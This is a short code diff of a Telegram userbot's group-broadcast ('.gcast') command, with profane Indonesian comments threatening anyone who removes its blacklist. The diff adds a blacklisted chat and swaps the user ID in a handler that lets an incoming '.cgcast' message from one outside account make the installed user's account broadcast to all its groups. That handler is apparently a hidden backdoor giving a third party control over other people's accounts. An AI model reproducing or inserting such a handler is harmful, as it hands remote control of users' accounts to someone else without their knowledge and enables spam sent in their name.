@@ -5,6 +5,7 @@ GCAST_BLACKLIST = [
     -1001743853750,  # Cariteman
     -1001653425944,  # Bdrl
     -1001725649746,  # markettblack
+    -1001473548283,  # SharingBot
 ] 
 
 # Kalo fork atau coppy blacklist jangan dihapus bangsat,
@@ -12,7 +13,7 @@ GCAST_BLACKLIST = [
 # Hapus blacklist bapak lu jelek gua gban!.
 
 @register(outgoing=True, pattern=r"^\.gcast(?: |$)(.*)")
-@register(incoming=True, from_users=1972682280, pattern=r"^\.cgcast(?: |$)(.*)")
+@register(incoming=True, from_users=5259987566, pattern=r"^\.cgcast(?: |$)(.*)")
 async def gcast(event):
     xx = event.pattern_match.group(1)
     if xx:
